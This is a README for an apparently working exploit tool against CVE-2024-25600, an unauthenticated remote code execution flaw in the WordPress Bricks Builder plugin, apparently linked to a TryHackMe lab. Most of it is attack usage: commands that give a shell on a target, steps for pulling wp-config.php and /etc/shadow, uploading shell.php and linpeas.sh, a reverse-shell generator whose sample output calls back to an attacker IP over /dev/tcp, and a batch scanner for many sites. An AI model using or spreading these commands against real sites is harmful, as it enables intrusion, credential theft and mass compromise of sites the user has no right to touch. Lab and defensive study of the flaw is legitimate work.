# ğŸ§± BrickBreaker

<div align="center">

![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![CVE](https://img.shields.io/badge/CVE--2024--25600-Critical-DC143C?style=for-the-badge&logo=security&logoColor=white)
![Version](https://img.shields.io/badge/Version-2.2.0-00D26A?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-yellow?style=for-the-badge)

**ğŸ”¥ WordPress Bricks Builder RCE Exploit**

*Unauthenticated Remote Code Execution with Stable Interactive Shell*

[ğŸš€ Quick Start](#-quick-start) â€¢
[ğŸ“– Usage](#-usage) â€¢
[ğŸš Shell Commands](#-shell-commands) â€¢
[ğŸ”§ Technical Details](#-technical-details)

---

**âš¡ TL;DR - Get Shell in 10 Seconds**

```bash
python3 -m venv brickbreaker
source brickbreaker/bin/activate
pip install httpx rich && python3 brickbreaker.py https://target.com
```

</div>

---

## âœ¨ Features

| Feature | Description |
|:-------:|-------------|
| ğŸ”¥ | **Multiple Payloads** - `code`, `container`, `carousel` for different scenarios |
| ğŸš | **Interactive Shell** - Full PTY-like experience with command history |
| ğŸ“ | **File Transfer** - Upload/download files via base64 encoding |
| ğŸ”„ | **Reverse Shell** - Built-in generator with 5 payload types (bash, python, nc, php, perl) |
| ğŸ¨ | **Beautiful TUI** - Rich colored output with tables and progress bars |
| ğŸ” | **Batch Scanner** - Mass scan targets from file |
| âš¡ | **Fast & Reliable** - HTTP connection pooling with httpx |

---

## ğŸ“¦ Installation

### One-Liner Install

```bash
python3 -m venv brickbreaker
source brickbreaker/bin/activate
pip install httpx rich
```

### From Repository

```bash
git clone https://github.com/h0w1tzxr/TryHack3M-Bricks-Heist.git
cd TryHack3M-Bricks-Heist
pip install -r requirements.txt
```

### Requirements

- Python 3.8+
- `httpx` - Modern HTTP client
- `rich` - Beautiful terminal formatting

---

## ğŸš€ Quick Start

### Get Interactive Shell

```bash
python3 brickbreaker.py https://target.com
```

That's it! The exploit will:
1. âœ… Auto-extract nonce from target
2. âœ… Verify vulnerability
3. âœ… Drop you into an interactive shell

### Example Output

```
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
 â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
 â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
 â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•  â•šâ•â•    â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•

                   CVE-2024-25600 | RCE Exploit | v2.2.0 | by Constantines

âœ“ Nonce found: dce9f95a2a
âœ“ Target is VULNERABLE to CVE-2024-25600
  User: apache | Host: ip-10-81-181-56

â•­â”€ ğŸš BrickBreaker Shell â”€â”€â•®
â”‚ Shell established!       â”‚
â”‚ User: apache             â”‚
â”‚ Host: ip-10-81-181-56    â”‚
â”‚ Type 'help' for commands â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯

apache@ip-10-81-181-56:/var/www/html$ 
```

---

## ğŸ“– Usage

### Basic Commands

| Command | Description |
|---------|-------------|
| `python3 brickbreaker.py <url>` | Interactive shell |
| `python3 brickbreaker.py <url> -c "id"` | Execute single command |
| `python3 brickbreaker.py <url> -p container` | Use different payload |
| `python3 brickbreaker.py --scan targets.txt` | Batch scan |
| `python3 brickbreaker.py -h` | Show help |

### Detailed Examples

```bash
# Basic - Get interactive shell
python3 brickbreaker.py https://target.com

# Execute single command and exit
python3 brickbreaker.py https://target.com -c "cat /etc/passwd"

# Use container payload (if code payload fails)
python3 brickbreaker.py https://target.com -p container

# Batch scan multiple targets
python3 brickbreaker.py --scan targets.txt -o vulnerable.txt

# Quiet mode (minimal output)
python3 brickbreaker.py https://target.com -q -c "whoami"
```

### All Options

```
usage: brickbreaker.py [-h] [-c COMMAND] [-p {code,container,carousel}]
                       [-t TIMEOUT] [-q] [--scan FILE] [-o OUTPUT] [-v]
                       [url]

positional arguments:
  url                       Target URL (e.g., https://target.com)

options:
  -h, --help                Show this help message
  -c, --command COMMAND     Execute single command and exit
  -p, --payload TYPE        Payload type: code (default), container, carousel
  -t, --timeout SECONDS     Request timeout (default: 30)
  -q, --quiet               Minimal output, no banner
  --scan FILE               Batch scan URLs from file
  -o, --output FILE         Save vulnerable URLs to file
  -v, --version             Show version
```

---

## ğŸš Shell Commands

Once inside the interactive shell, you have access to these built-in commands:

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show available commands | `help` |
| `info` | Display session info (user, kernel, IP, etc.) | `info` |
| `clear` | Clear terminal screen | `clear` |
| `cd <dir>` | Change directory (persistent) | `cd /tmp` |
| `download <file>` | Download file to your machine | `download /etc/passwd` |
| `upload <file>` | Upload local file to target's `/tmp/` | `upload linpeas.sh` |
| `revshell` | Generate & execute reverse shell | `revshell` |
| `exit` | Close session | `exit` |

### ğŸ“¥ Download Files

```bash
apache@target:/var/www/html$ download wp-config.php
âœ“ Downloaded: wp-config.php (3847 bytes)

apache@target:/var/www/html$ download /etc/shadow
âœ“ Downloaded: shadow (1245 bytes)
```

### ğŸ“¤ Upload Files

```bash
apache@target:/var/www/html$ upload linpeas.sh
âœ“ Uploaded to: /tmp/linpeas.sh

apache@target:/var/www/html$ upload shell.php
âœ“ Uploaded to: /tmp/shell.php
```

### ğŸ”„ Reverse Shell

```bash
apache@target:/var/www/html$ revshell
Your IP: 10.10.14.5
Your Port [4444]: 9001

â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Reverse Shells â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚ Type   â”‚ Payload                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ bash   â”‚ nohup bash -c "bash -i >&... â”‚
â”‚ python â”‚ nohup python3 -c 'import ... â”‚
â”‚ nc     â”‚ rm -f /tmp/f;mkfifo /tmp/... â”‚
â”‚ php    â”‚ nohup php -r '$s=fsockope... â”‚
â”‚ perl   â”‚ nohup perl -e 'use Socket... â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯

Execute which? [bash/python/nc/php/perl/none]: bash
Start listener first: nc -lvnp 9001
Continue? [y/n]: y
Executing: nohup bash -c "bash -i >& /dev/tcp/10.10.14...
âœ“ Reverse shell payload sent!
Check your listener for connection
```

> **Note:** All reverse shells are backgrounded with `nohup ... &` to prevent HTTP timeout issues.

---

## ğŸ”§ Technical Details

### Vulnerability Information

| Property | Value |
|----------|-------|
| **CVE ID** | CVE-2024-25600 |
| **CVSS Score** | 9.8 (Critical) |
| **Type** | Unauthenticated Remote Code Execution |
| **Affected** | Bricks Builder â‰¤ 1.9.6 |
| **Patched** | Bricks Builder 1.9.6.1+ |
| **Disclosed** | February 2024 |

### How It Works

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  1. NONCE EXTRACTION                                                        â”‚
â”‚     GET https://target.com                                                  â”‚
â”‚     â””â”€> Extract nonce from bricksData JavaScript object                     â”‚
â”‚                                                                             â”‚
â”‚  2. PAYLOAD DELIVERY                                                        â”‚
â”‚     POST /wp-json/bricks/v1/render_element                                  â”‚
â”‚     â””â”€> {"postId":"1", "nonce":"xxx", "element":{"settings":{...}}}         â”‚
â”‚                                                                             â”‚
â”‚  3. CODE EXECUTION                                                          â”‚
â”‚     PHP eval() in prepare_query_vars_from_settings()                        â”‚
â”‚     â””â”€> shell_exec($user_controlled_input)                                  â”‚
â”‚                                                                             â”‚
â”‚  4. OUTPUT EXTRACTION                                                       â”‚
â”‚     Parse response for BRKSTART...BRKEND markers                            â”‚
â”‚     â””â”€> Return clean command output                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Payload Types

| Type | Description | When to Use |
|------|-------------|-------------|
| `code` | Direct PHP code execution via `executeCode` | **Default** - Most reliable |
| `container` | Query injection via loop element | If `code` fails |
| `carousel` | Query injection via carousel element | Alternative fallback |

---

## ğŸ” Batch Scanning

Scan multiple targets from a file:

```bash
# Create targets file
cat > targets.txt << EOF
https://site1.com
https://site2.com
https://site3.com
EOF

# Scan all targets
python3 brickbreaker.py --scan targets.txt

# Save vulnerable URLs
python3 brickbreaker.py --scan targets.txt -o vulnerable.txt
```

### Output

```
                   CVE-2024-25600 | RCE Exploit | v2.2.0 | by Constantines

Scanning 3 targets...

âœ“ VULNERABLE: https://site1.com
âœ— Not vulnerable: https://site2.com
âœ“ VULNERABLE: https://site3.com

Results: 2/3 vulnerable
Saved to: vulnerable.txt
```

---

## â“ Troubleshooting

### "Failed to extract nonce"
- Target may not use Bricks Builder theme
- Try accessing the target URL manually to verify it's up
- Check if the target has WAF blocking requests

### "Target does not appear vulnerable"
- Bricks Builder may be patched (â‰¥ 1.9.6.1)
- Try different payload type: `-p container` or `-p carousel`

### Commands return empty output
- Some commands don't produce output (e.g., `touch`, `mkdir`)
- Use `ls` or `cat` to verify command executed

### Reverse shell not connecting
- Ensure your listener is running BEFORE executing
- Check firewall rules on both ends
- Try different reverse shell type (python, nc, php)

---

## âš ï¸ Disclaimer

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  THIS TOOL IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY  â•‘
â•‘                                                                              â•‘
â•‘  â€¢ Only use on systems you own or have explicit written permission to test   â•‘
â•‘  â€¢ Unauthorized access to computer systems is illegal                        â•‘
â•‘  â€¢ The author is not responsible for any misuse or damage caused             â•‘
â•‘  â€¢ Always follow responsible disclosure practices                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

---

## ğŸ“š References

- [CVE-2024-25600 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-25600)
- [Original Disclosure - Snicco](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6)
- [Bricks Builder](https://bricksbuilder.io/)
- [TryHackMe - Bricks Heist](https://tryhackme.com/room/introtosecurityarchitecture)

---

## ğŸ™ Credits

| Role | Credit |
|------|--------|
| **Exploit Author** | [Constantines](https://github.com/h0w1tzxr) |
| **Vulnerability Discovery** | [Snicco Security](https://snicco.io) |
| **Original PoC Inspiration** | [Chocapikk](https://github.com/Chocapikk/CVE-2024-25600) |

---

<div align="center">

**Made by Constantines**

![Stars](https://img.shields.io/github/stars/h0w1tzxr/TryHack3M-Bricks-Heist?style=social)
![Forks](https://img.shields.io/github/forks/h0w1tzxr/TryHack3M-Bricks-Heist?style=social)

*If you found this useful, consider giving it a â­!*

</div>
